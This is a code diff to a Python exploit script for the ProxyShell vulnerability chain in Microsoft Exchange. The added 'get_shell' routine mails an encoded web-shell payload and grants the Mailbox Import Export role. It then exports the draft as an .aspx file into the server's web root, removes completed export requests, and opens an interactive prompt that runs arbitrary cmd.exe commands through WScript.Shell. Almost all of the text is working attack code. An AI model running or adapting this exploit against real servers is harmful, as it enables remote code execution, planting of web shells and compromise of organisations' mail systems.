@@ -5,7 +5,7 @@ import struct
 import base64
 import string
 import random
-import re
+import time
 import threading
 import xml.etree.ElementTree as ET
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -25,10 +25,10 @@ class ExchangePowershellHandler(BaseHTTPRequestHandler):
         length = int(self.headers['content-length'])
         content_type = self.headers['content-type']
         post_data = self.rfile.read(length).decode()
-        post_data = re.sub('<wsa:To>(.*?)</wsa:To>',
-                           '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
-        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>',
-                           '<wsman:ResourceUśI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)
+        # post_data = re.sub('<wsa:To>(.*?)</wsa:To>',
+        #                    '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
+        # post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>',
+        #                    '<wsman:ResourceUśI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)
 
         headers = {
             'Content-Type': content_type
@@ -36,6 +36,7 @@ class ExchangePowershellHandler(BaseHTTPRequestHandler):
 
         powershell_endpoint = exchange_url + \
             f"/autodiscover/autodiscover.json?@test.com/powershell/?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com"
+        # import pdb; pdb.set_trace()
         resp = requests.post(powershell_endpoint,
                              data=post_data, headers=headers, verify=False)
         content = resp.content
@@ -143,7 +144,8 @@ def rand_subject(n=6):
     return ''.join(random.choices(string.ascii_lowercase, k=n))
 
 def send_email_contains_malicious_payload():
-    encoded_payload = generate_payload()
+    # encoded_payload = generate_payload()
+    encoded_payload = "ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoLZnl33BlQUt9MGObmp39opINOpDYzJ6Z45OTk52qWpzYy+2lz32tYUfoLaddpUKVTTDdqCD2uC9wbWqV3agskxvtrWadMG1trzRAYNMZ45OTk5IZ6V+9ZUhrdpFNk="
     subject_id = rand_subject(16)
     print (f"[-] Sending email contains payload with subject id: {subject_id}")
     email_body = f"""
@@ -208,20 +210,77 @@ def start_server(url: str, token: str, port: int):
     server_thread.start()
 
 
-def shell(command, port):
+def shell(command: str, port):
     # Credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
     if command.lower() in ['exit', 'quit']:
         exit()
 
     wsman = WSMan("127.0.0.1", username='', password='', ssl=False,
                   port=port, auth='basic', encryption='never')
-    with RunspacePool(wsman) as pool:
-        ps = PowerShell(pool)
-        ps.add_script(command)
-        output = ps.invoke()
+    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
+        if command.lower().strip() == "get_shell":
+            subject_id = send_email_contains_malicious_payload()
+            assign_permission_command = f"New-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User {email}"
+            print ("[-] Executing command: ", assign_permission_command)
+            ps = PowerShell(pool)
+            ps.add_script(assign_permission_command)
+            output_1 = ps.invoke()
+            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output_1]))
+            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
 
-    print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
-    print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
+            cleanup_export_command = "Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false"
+            print ("[-] Executing command: ", cleanup_export_command)
+            ps = PowerShell(pool)
+            ps.add_script(cleanup_export_command)
+            output_2 = ps.invoke()
+            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output_2]))
+            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
+
+            file_path = f"\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\{subject_id}.aspx"
+            write_fie_command = f"""New-MailboxExportRequest -Mailbox {email} -IncludeFolders "#Drafts#" -FilePath "{file_path}" -ContentFilter "Subject -eq '{subject_id}'" """
+            print ("[-] Executing command: ", write_fie_command)
+            ps = PowerShell(pool)
+            ps.add_script(write_fie_command)
+            output_3 = ps.invoke()
+            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output_3]))
+            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
+
+            shell_url = f'{exchange_url}/aspnet_client/{subject_id}.aspx'
+            print(f'Shell URL: {shell_url}')
+            for i in range(10):
+                print(f'Testing shell {i}')
+                r = requests.get(shell_url, verify=False)
+                if r.status_code == 200:
+                    delimit = rand_subject()
+                    
+                    while True:
+                        cmd = input('Shell> ')
+                        if cmd.lower() in ['exit', 'quit']:
+                            return
+
+                        exec_code = f'Response.Write("{delimit}" + new ActiveXObject("WScript.Shell").Exec("cmd.exe /c {cmd}").StdOut.ReadAll() + "{delimit}");'
+                        r = requests.get(
+                            shell_url,
+                            params={
+                                'exec_code':exec_code
+                            },
+                            verify=False
+                        )
+                        output = r.content.split(delimit.encode())[1]
+                        print(output.decode())
+
+                time.sleep(5)
+                i += 1
+
+            print('Shell drop failed :(')
+            return
+
+        else:
+            ps = PowerShell(pool)
+            ps.add_script(command)
+            output = ps.invoke()
+            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
+            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
 
 # ------------------------------------------------------------------------------
 
@@ -239,7 +298,9 @@ def main():
     exchange_url = args.u
     email = args.e
     local_port = args.p
-
+    # Ignore TLS Verify error
+    requests.packages.urllib3.disable_warnings(
+        requests.packages.urllib3.exceptions.InsecureRequestWarning)
     # Stage 1
     is_vulnerable = check_proxyshell_on_exchange(exchange_url)
     if not is_vulnerable:
@@ -249,8 +310,6 @@ def main():
     token = gen_token(email, sid)
     check_token_valid(exchange_url, token)
     # Stage 3
-    send_email_contains_malicious_payload()
-
     # Proxy server
     start_server(port=local_port, url=exchange_url, token=token)
 
